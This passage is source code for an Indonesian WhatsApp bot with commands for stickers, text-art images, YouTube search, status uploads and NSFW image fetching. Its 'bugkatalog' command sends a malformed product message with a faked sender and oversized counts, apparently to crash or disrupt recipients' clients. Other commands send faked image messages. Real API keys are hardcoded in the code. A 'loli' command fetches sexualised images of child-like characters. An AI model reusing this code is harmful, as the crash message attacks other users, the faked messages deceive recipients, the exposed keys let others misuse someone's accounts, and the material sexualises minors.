					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/alam?text=${darknn}&theme=summer&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					tsukasa.sendMessage(from, buffer1, image, {quoted: mek, caption: `${darknn}\n\nJangan Lupa Subrek Channel Gw Ngab : https://youtube.com/channel/UCC9AQoGkCOLZVOAVRqVwwZg`})
					break
			case 'flower': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} TsukasaChan`)
					darknn = body.slice(9)
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/alam?text=${darknn}&theme=flower&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					tsukasa.sendMessage(from, buffer1, image, {quoted: mek, caption: `${darknn}\n\nJangan Lupa Subrek Channel Gw Ngab : https://youtube.com/channel/UCC9AQoGkCOLZVOAVRqVwwZg`})
					break
			case 'burn': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} TsukasaChan`)
					darknn = body.slice(9)
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/random?text=${darknn}&theme=text-burn&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					tsukasa.sendMessage(from, buffer1, image, {quoted: mek, caption: `${darknn}\n\nJangan Lupa Subrek Channel Gw Ngab : https://youtube.com/channel/UCC9AQoGkCOLZVOAVRqVwwZg`})
					break
			case 'quote': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} TsukasaChan`)
					darknn = body.slice(9)
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/random?text=${darknn}&theme=art-quote&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					tsukasa.sendMessage(from, buffer1, image, {quoted: mek, caption: `${darknn}\n\nJangan Lupa Subrek Channel Gw Ngab : https://youtube.com/channel/UCC9AQoGkCOLZVOAVRqVwwZg`})
					break
			case 'wooden': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} TsukasaChan`)
					darknn = body.slice(9)
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/roses?text=${darknn}&theme=wooden-boarch&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					tsukasa.sendMessage(from, buffer1, image, {quoted: mek, caption: `${darknn}\n\nJangan Lupa Subrek Channel Gw Ngab : https://youtube.com/channel/UCC9AQoGkCOLZVOAVRqVwwZg`})
					break
			case 'golden': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} TsukasaChan`)
					darknn = body.slice(9)
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/roses?text=${darknn}&theme=golden&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					tsukasa.sendMessage(from, buffer1, image, {quoted: mek, caption: `${darknn}\n\nJangan Lupa Subrek Channel Gw Ngab : https://youtube.com/channel/UCC9AQoGkCOLZVOAVRqVwwZg`})
					break               
					case 'stikerwm':
					       case 'stickerwm':
					              case 'swm':
					              case 'wm':
					                            var a = 'Nama Stiker'
					                                          var b = 'Author'
					                                                        if (isMedia && !mek.message.videoMessage || isQuotedImage ) {
					                                                                      const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
					                                                                                    media = await tsukasa.downloadAndSaveMediaMessage(encmedia)
					                                                                                                  await createExif(a,b)
					                                                                                                                out = getRandom('.webp')
					                                                                                                                              ffmpeg(media)
					                                                                                                                                           .on('error', (e) => {
					                                                                                                                                                         console.log(e)
					                                                                                                                                                                       tsukasa.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
					                                                                                                                                                                                     fs.unlinkSync(media)
					                                                                                                                                                                                     })
					                                                                                                                                                                                                  .on('end', () => {
					                                                                                                                                                                                                              _out = getRandom('.webp')
					                                                                                                                                                                                                                            spawn('webpmux', ['-set','exif','./sticker/data.exif', out, '-o', _out])
					                                                                                                                                                                                                                                         .on('exit', () => {
					                                                                                                                                                                                                                                                       tsukasa.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
					                                                                                                                                                                                                                                                                     fs.unlinkSync(out)
					                                                                                                                                                                                                                                                                                   fs.unlinkSync(_out)
					                                                                                                                                                                                                                                                                                                 fs.unlinkSync(media)
					                                                                                                                                                                                                                                                                                                 })
					                                                                                                                                                                                                                                                                                                 })
					                                                                                                                                                                                                                                                                                                              .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
					                                                                                                                                                                                                                                                                                                                           .toFormat('webp')
					                                                                                                                                                                                                                                                                                                                                        .save(out) 
					                                                                                                                                                                                                                                                                                                                                                      } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
					                                                                                                                                                                                                                                                                                                                                                                    const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
					                                                                                                                                                                                                                                                                                                                                                                                  const media = await tsukasa.downloadAndSaveMediaMessage(encmedia)
					                                                                                                                                                                                                                                                                                                                                                                                                pe = args.join('')
					                                                                                                                                                                                                                                                                                                                                                                                                              var a = 'Nama stiker'
					                                                                                                                                                                                                                                                                                                                                                                                                                            var b = 'Author'
					                                                                                                                                                                                                                                                                                                                                                                                                                                          await createExif(a,b)
					                                                                                                                                                                                                                                                                                                                                                                                                                                                        out = getRandom('.webp')
					                                                                                                                                                                                                                                                                                                                                                                                                                                                                      ffmpeg(media)
					                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   .on('error', (e) => {
					                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 console.log(e)
					                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               tsukasa.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
					                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             fs.unlinkSync(media)
					                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             })
					                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          .on('end', () => {
					                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      _out = getRandom('.webp')
					                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    spawn('webpmux', ['-set','exif','./sticker/data.exif', out, '-o', _out])
					                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 .on('exit', () => {
					                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               tsukasa.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
					                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             fs.unlinkSync(out)
					                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           fs.unlinkSync(_out)
					                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         fs.unlinkSync(media)
					                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         })
					                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         })
					                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
					                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   .toFormat('webp')
					                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                .save(out)       
					                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              } else {
					                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            reply(`Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`)
					                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            }
					                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          break
   						 case 'gifstiker':
				case 's':
			case 'stickergif':  
				case 'sticker':
				  case 'stiker':
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await tsukasa.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						await ffmpeg(`./${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								reply(mess.error.stick)
							})
							.on('end', function () {
								console.log('Finish')
								buff = fs.readFileSync(ran)
								tsukasa.sendMessage(from, fs.readFileSync(ran), sticker, { quoted : mek}) 
								fs.unlinkSync(media)
								fs.unlinkSync(ran)
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
					} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await tsukasa.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						reply(mess.wait)
						await ffmpeg(`./${media}`)
							.inputFormat(media.split('.')[1])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								reply(`Yah error dek`)
							})
							.on('end', function () {
								console.log('Finish')
								buff = fs.readFileSync(ran)
								tsukasa.sendMessage(from, buff, sticker, {quoted: mek})
								fs.unlinkSync(media)
								fs.unlinkSync(ran)
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
					} else if ((isMedia || isQuotedImage) && args[0] == 'nobg') {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await tsukasa.downloadAndSaveMediaMessage(encmedia)
						ranw = getRandom('.webp')
						ranp = getRandom('.png')
						reply(mess.wait)
						keyrmbg = 'J93DHS3AqHmXJQWm4XLv9iRY'
						await removeBackgroundFromImageFile({path: media, apiKey: keyrmbg.result, size: 'auto', type: 'auto', ranp}).then(res => {
							fs.unlinkSync(media)
							let buffer = Buffer.from(res.base64img, 'base64')
							fs.writeFileSync(ranp, buffer, (err) => {
								if (err) return reply('Yah error dek')
							})
							exec(`ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${ranw}`, (err) => {
								fs.unlinkSync(ranp)
								if (err) return reply(mess.error.stick)
								buff = fs.readFileSync(ranw)
								tsukasa.sendMessage(from, buff, sticker, {quoted: mek})
							})
						    })					
					} else {
						reply(`𝗸𝗶𝗿𝗶𝗺 𝗴𝗮𝗺𝗯𝗮𝗿 𝗱𝗲𝗻𝗴𝗮𝗻 𝗰𝗮𝗽𝘁𝗶𝗼𝗻 ${prefix}𝘀𝘁𝗶𝗰𝗸𝗲𝗿 𝗮𝘁𝗮𝘂 𝗿𝗲𝗽𝗹𝘆/𝘁𝗮𝗴 𝗴𝗮𝗺𝗯𝗮𝗿`)
					}
					break
            case 'tutupgrup':
                tsukasa.groupSettingChange(from, "announcement", true)
                .then((res) => reply(jsonformat(res)))
                .catch((err) => reply(jsonformat(err)))
                break                
				case 'info':
					me = tsukasa.user
					uptime = process.uptime()
					teks = `*Nama bot* : ${me.name}\n*Nomor Bot* : @${me.jid.split('@')[0]}\n*Prefix* : ${prefix}\n*Total Block Contact* : ${blocked.length}\n*The bot is active on* : ${kyun(uptime)}`
					buffer = await getBuffer(me.imgUrl)
					tsukasa.sendMessage(from, buffer, image, {caption: teks, contextInfo:{mentionedJid: [me.jid]}})
					break
				case 'blocklist':
					teks = 'This is list of blocked number :\n'
					for (let block of blocked) {
						teks += `~> @${block.split('@')[0]}\n`
					}
					teks += `Total : ${blocked.length}`
					tsukasa.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": blocked}})
					break
					case 'virgam':
	const tsukasa4 = fs.readFileSync(`./media/image.jpeg`)
tsukasa.sendMessage(from,tsukasa4,image,{mimetype: Mimetype.image,quoted : fdocs, thumbnail: fs.readFileSync(`./media/virgam.jpeg`)})
break 
case 'tovgam':
		//if (!isXEN) return tsukasa.reply(from, 'YAHH ERROR', qul)
				//replyy(mess.wait)
						if ((isMedia/virgam || isQuotedImage)) {
								    let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(virgam).replace('quotedM','m')).message.extendedTextMessage.contextInfo : virgam
											let media = await tsukasa.downloadMediaMessage(encmedia)
													    tsukasa.sendFakeImg(from, media, virgam)
															    } else {
																		tsukasa.reply(from, `Kirim gambar atau reply dengan caption ${prefix}tovgam`)
																				}
																						break 
				case 'meme':
					meme = await fetchJson('https://kagchi-api.glitch.me/meme/memes', { method: 'get' })
					buffer = await getBuffer(`https://imgur.com/${meme.hash}.jpg`)
					tsukasa.sendMessage(from, buffer, image, {quoted: mek, caption: '.......'})
					break
case 'z': 
var value = body.slice(3)
var group = await tsukasa.groupMetadata(from)
var member = group['participants']
var mem = []
member.map( async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
text: value,
contextInfo: { mentionedJid: mem,
quoted: mek
}}
tsukasa.sendMessage(from, options, text)
break
case 'igstalk': 
if (!q)return reply(`Example : ${prefix + command} oreki.houtarou.v`)
reply(mess.wait)
anu = await fetchJson(`http://zekais-api.herokuapp.com/igs?username=${q}`)
ig = `*「 INSTAGRAM STALK」*

⌬  *Username : ${anu.data.username}*
⌬  *Full Name : ${anu.data.fullname}*
⌬  *Followers : ${anu.data.follower}*
⌬  *Following : ${anu.data.following}*
⌬  *BIO : ${anu.data.bio}*

⌬  *_Link INSTAGRAM :_*
     https://instagram.com/${q}`
buff = await getBuffer(anu.data.profilehd)
tsukasa.sendMessage(from, buff, image,{quoted:mek,caption:ig}) 
break
case 'lirik': 
if(!q) return reply(`Example : ${prefix + command} melukis mekja`)
anu = await fetchJson(`http://zekais-api.herokuapp.com/lirik?query=${q}`)
lirik = `❒ *「 Lirik Lagu 」* ❒ \n\n*Judul : ${anu.title}*\n*Author : ${anu.author}*\n\n*Lirik :* \n${anu.lirik} `
buf = await getBuffer(anu.thumb)
tsukasa.sendMessage(from,buf,image,{quoted:mek,caption:lirik})
break
case 'glitch': 
if(!q) return reply(`Example : ${prefix}glitch nama|autor`)
g1 = q.split('|')[0]
g2 = q.split('|')[1]
reply(mess.wait)
glitch = await getBuffer(`https://api.zeks.xyz/api/gtext?apikey=${zeks}&text1=${g1}&text2=${g2}`)
tsukasa.sendMessage(from,glitch,image,{quoted:mek}) 
break
case 'tahta': 
if (args.length < 1) return reply('*Teks nya mana?*') 
tahta = args.join(" ")
tahta = await getBuffer(`https://api.zeks.xyz/api/hartatahta?apikey=${zeks}&text=${tahta}`)
tsukasa.sendMessage(from,tahta,image,{quoted:mek}) 
break 
case 'url2img':
if (!q)return reply('Url nya mana?')
sendMediaURL(from,`${q}`)
break
case 'img2url': 
var encmedia  = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
var media = await  tsukasa.downloadAndSaveMediaMessage(encmedia)
var imgbb = require('imgbb-uploader')
imgbb('e4bb5222011a8521cc60ce61a2aa1f98', media)
.then(data => {
var caps = `❒ 「 *IMGBB TO URL* 」\n\n➸ *ID :* ${data.id}\n➸  *MimeType :* ${data.image.mime}\n➸ *Extension :* ${data.image.extension}\n➸ *URL :* ${data.display_url}`
			ibb = fs.readFileSync(media)
tsukasa.sendMessage(from, ibb, image, { quoted: mek, caption: caps })
})
.catch(err => {
throw err 
}) 
break

case 'tovn':
if (!isQuotedAudio) return reply('Tag audio/vn nya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await tsukasa.downloadAndSaveMediaMessage(encmedia)
hah = fs.readFileSync(media)
tsukasa.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, quoted: mek})
fs.unlinkSync(media)
break 				
case 'neko':
anu = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=neko&apikey=hardianto`) 
tsukasa.sendMessage(from,anu,image, {quoted : mek,caption : '© ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ'})
break
case 'ngif':
anu = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=nekoGif&apikey=hardianto`)
tsukasa.sendMessage(from,anu ,video,{mimetype: Mimetype.gif},{quoted : mek})
break
case 'hgif':
anu = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=randomHentaiGif&apikey=hardianto`) 
tsukasa.sendMessage(from,anu ,video,{mimetype: Mimetype.gif},{quoted : mek})
break
case 'asupan':
anu = await getBuffer(`https://hardianto-chan.herokuapp.com/api/asupan?apikey=hardianto`)
tsukasa.sendMessage(from,anu ,video,{quoted : mek})
break
case 'gasm':
anu = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=gasm&apikey=hardianto`) 
tsukasa.sendMessage(from,anu,image, {quoted : mek,caption : '© ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ'})
break
case 'eroyuri':
anu = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=eroYuri&apikey=hardianto`) 
tsukasa.sendMessage(from,anu,image, {quoted : mek,caption : '© ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ'})
break
case 'eroneko':
anu = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=eroNeko&apikey=hardianto`) 
tsukasa.sendMessage(from,anu,image, {quoted : mek,caption : '© ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ'})
break
case 'erokemonomimi':
anu = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=eroKemonomimi&apikey=hardianto`) 
tsukasa.sendMessage(from,anu,image, {quoted : mek,caption : '© ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ'})
break
case 'erokitsune':
anu = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=eroKitsune&apikey=hardianto`) 
tsukasa.sendMessage(from,anu,image, {quoted : mek,caption : '© ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ'})
break
case 'feet':
anu = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=feet&apikey=hardianto`) 
tsukasa.sendMessage(from,anu,image, {quoted : mek,caption : '© ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ'})
break
case 'erofeet':
anu = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=eroFeet&apikey=hardianto`) 
tsukasa.sendMessage(from,anu,image, {quoted : mek,caption : '© ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ'})
break
case 'femdom':
anu = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=femdom&apikey=hardianto`) 
tsukasa.sendMessage(from,anu,image, {quoted : mek,caption : '© ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ'})
break
case 'futanari':
anu = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=futanari&apikey=hardianto`) 
tsukasa.sendMessage(from,anu,image, {quoted : mek,caption : '© ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ'})
break
case 'hentai':
anu = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=hentai&apikey=hardianto`) 
tsukasa.sendMessage(from,anu,image, {quoted : mek,caption : '© ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ'})
break
case 'loli':
anu = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/loli?apikey=hardianto`) 
tsukasa.sendMessage(from,anu,image, {quoted : mek,caption : '© ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ'})
break
case 'holoero':
anu = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=holoEro&apikey=hardianto`) 
tsukasa.sendMessage(from,anu,image, {quoted : mek,caption : '© ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ'})
break
case 'holo':
anu = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=holo&apikey=hardianto`) 
tsukasa.sendMessage(from,anu,image, {quoted : mek,caption : '© ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ'})
break
case 'keta':
anu = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=keta&apikey=hardianto`) 
tsukasa.sendMessage(from,anu,image, {quoted : mek,caption : '© ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ'})
break
case 'kitsune':
anu = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=kitsune&apikey=hardianto`) 
tsukasa.sendMessage(from,anu,image, {quoted : mek,caption : '© ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ'})
break
case 'kemonomimi':
anu = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=kemonomimi&apikey=hardianto`) 
tsukasa.sendMessage(from,anu,image, {quoted : mek,caption : '© ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ'})
break
case 'girlsolo':
anu = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=girlSolo&apikey=hardianto`) 
tsukasa.sendMessage(from,anu,image, {quoted : mek,caption : '© ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ'})
break
case 'tits':
anu = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=tits&apikey=hardianto`) 
tsukasa.sendMessage(from,anu,image, {quoted : mek,caption : '© ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ'})
break
case 'trap':
anu = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=trap&apikey=hardianto`) 
tsukasa.sendMessage(from,anu,image, {quoted : mek,caption : '© ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ'})
break
case 'yuri':
anu = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=yuri&apikey=hardianto`) 
tsukasa.sendMessage(from,anu,image, {quoted : mek,caption : '© ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ'})
break
case 'avatar':
anu = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=avatar&apikey=hardianto`) 
tsukasa.sendMessage(from,anu,image, {quoted : mek,caption : '© ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ'})
break
case 'gecg':
anu = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=gecg&apikey=hardianto`) 
tsukasa.sendMessage(from,anu,image, {quoted : mek,caption : '© ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ'})
break
case 'wallpaper':
anu = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=wallpaper&apikey=hardianto`) 
tsukasa.sendMessage(from,anu,image, {quoted : mek,caption : '© ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ'})
break
case 'kemonomimi':
anu = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=kemonomimi&apikey=hardianto`) 
tsukasa.sendMessage(from,anu,image, {quoted : mek,caption : '© ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ'})
break
case 'foxgirl':
anu = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=foxGirl&apikey=hardianto`) 
tsukasa.sendMessage(from,anu,image, {quoted : mek,caption : '© ꪶ𖣂ꫂXennChanꪶ𖣂ꫂ'})
break
  					case 'bugkatalog':
  					tsukasa.toggleDisappearingMessages(from,`AaaaGoblok`,text)
    hmm4 = fs.readFileSync(`./media/image.jpeg`)
imeu = await tsukasa.prepareMessage('0@s.whatsapp.net', hmm4, image)

imeg = imeu.message.imageMessage
res = await tsukasa.prepareMessageFromContent(from,{
  "productMessage": {
  "product": {
  "productImage": imeg,
  "productId": "", 
  "title": ngazap(prefix),
"description": emoji2(prefix), 
"priceAmount1000": "99999999",
"descriptionCount": "999999999",
  "productImageCount": "1",
  },
  "businessOwnerJid": "6285709664923@s.whatsapp.net",
  "contextInfo": {
  "forwardingScore": 9999,
  "isForwarded": true
  }
  }
  }, {quoted: {
				  key: {
				   fromMe: false,
				   participant: `0@s.whatsapp.net`, // Fake sender Jid
				   remoteJid: "status@broadcast"
				  },
				  message: {
				   orderMessage: {
				    itemCount: 999999999, // Bug
				    status: 1,
				    surface: 1,
				    message: '999999999',
				    orderTitle: '999999999', // Idk what this does
				    sellerJid: `0@s.whatsapp.net` // Seller
				   }
				  }
				 }
				})
  tsukasa.relayWAMessage(res)
  tsukasa.toggleDisappearingMessages(from,`AaaaGoblok`,text)
  break
                                case 'upswlokasi':
  if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(12)
                    tsukasa.sendMessage('status@broadcast', {degreesLatitude: 36.036105801662316, degreesLongitude: 138.09072320256624, name:teks,address:`XCHillDs`}, MessageType.location)
                    reply(`Sukses upload lokasi:\n${teks}`)
                    break	
                    case 'upswsticker':
if (!isQuotedSticker) return reply('Reply stikernya!')
if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await tsukasa.downloadMediaMessage(encmedia)
						tsukasa.sendMessage('status@broadcast', buff, sticker)
						}
						reply(`Sukses upload sticker`)
                    break
                     case 'upswaudio':
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await tsukasa.downloadMediaMessage(encmedia)
						tsukasa.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400})
						}
						reply(`Sukses upload audio`)
						break
                    case 'play': 
if (args.length < 1) return reply('Apa Yang Mau Dicari?')
teks = args.join(' ')
reply(mess.wait)
if (!teks.endsWith("-doc")){
res = await yts(`${teks}`).catch(e => {
reply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')
})
reply(` Playing ${res.all[0].title}`)
let thumbInfo = ` *Youtube Search*
 *Judul :* ${res.all[0].title}
 *ID Video :* ${res.all[0].videoId}
 *Diupload Pada :* ${res.all[0].ago}
 *Views :* ${res.all[0].views}
 *Durasi :* ${res.all[0].timestamp}
 *Channel :* ${res.all[0].author.name}
*Link Channel :* ${res.all[0].author.url}

*_Tunggu Proses Upload....._*
`
sendFileFromUrl(res.all[0].image, image, {quoted: ftoko, caption: thumbInfo})
res = await y2mateA(res.all[0].url).catch(e => {
reply('_[ ! ] Error Saat Memasuki Web Y2mate_')
})
sendFileFromUrl(res[0].link, audio, {quoted: fdocs, mimetype: 'audio/mp4', filename: res[0].output})
}
if (teks.endsWith("-doc")){
const tec = teks.split("-doc")
res = await yts(`${tec}`).catch(e => {
reply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')
})
reply(`.Playing ${res.all[0].title}`)
let thumbInfo = `*${botname}* 
 *Judul :* ${res.all[0].title}
 *ID Video :* ${res.all[0].videoId}
 *Diupload Pada :* ${res.all[0].ago}
 *Views :* ${res.all[0].views}
 *Durasi :* ${res.all[0].timestamp}
 *Channel :* ${res.all[0].author.name}
*Link Channel :* ${res.all[0].author.url}

*_Tunggu Proses Upload....._*
`
sendFileFromUrl(res.all[0].image, image, {quoted: ftoko, caption: thumbInfo})
res = await y2mateA(res.all[0].url).catch(e => {
reply('_[ ! ] Error Saat Memasuki Web Y2mate_')
})
sendFileFromUrl(res[0].link, document, {quoted: ftoko, mimetype: 'audio/mp3', filename: res[0].output})
}
break
case 'ytsearch':
case 'yts':
if (args.length < 1) return reply('Tolong masukan query!')
var srch = args.join('');
try {
	var aramas = await yts(srch);
	} catch {
return await tsukasa.sendMessage(from, 'Error!', MessageType.text, dload)
}
aramat = aramas.all 
var tbuff = await getBuffer(aramat[0].image)
var ytresult = '';
ytresult += '「 *YOUTUBE SEARCH* 」'
ytresult += '\n________________________\n\n'
aramas.all.map((video) => {
ytresult += '❏ Title: ' + video.title + '\n'
ytresult += '❏ Link: ' + video.url + '\n'
ytresult += `❏ Use Dowbload Typing ${prefix}ytmp3 [Link] Or ${prefix}ytmp4 [Link]` +'\n'
ytresult += '❏ Durasi: ' + video.timestamp + '\n'
